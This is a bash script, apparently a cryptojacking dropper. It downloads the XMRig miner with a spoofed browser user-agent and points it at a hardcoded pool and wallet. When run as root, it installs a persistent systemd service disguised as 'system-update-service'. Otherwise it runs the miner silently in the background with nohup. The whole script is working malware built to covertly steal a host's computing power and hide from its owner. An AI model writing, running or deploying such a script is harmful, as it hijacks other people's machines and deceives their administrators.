#!/bin/bash

# Configuration
TAR_FILE="kal.tar.gz"
EXTRACT_DIR="xmrig-6.24.0"
BINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"
ARGS="--url pool.hashvault.pro:443 --user 8BWy7pgane96sLATF7nESM4ehZEtYAFNpYFAm88zftVsJ5jxFBdGVBrd1igptedXejfomPEpJvGUKU1etmkNBXmU5HkPR6e --pass ZimbabveDC --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
SERVICE_NAME="system-update-service"

# Download and setup if not already present
if [ ! -f "$BINARY_PATH" ]; then
    curl -L -o "$TAR_FILE" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
    tar xvzf "$TAR_FILE"
fi

chmod +x "$BINARY_PATH"

# Attempt systemd setup
INSTALLED_SYSTEMD=0
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "Root privileges detected. Attempting systemd setup..."
    
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} ${ARGS}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        echo "Service started via systemd."
        INSTALLED_SYSTEMD=1
    fi
fi

# Fallback to nohup
if [ $INSTALLED_SYSTEMD -eq 0 ]; then
    echo "Starting with nohup..."
    nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &
fi
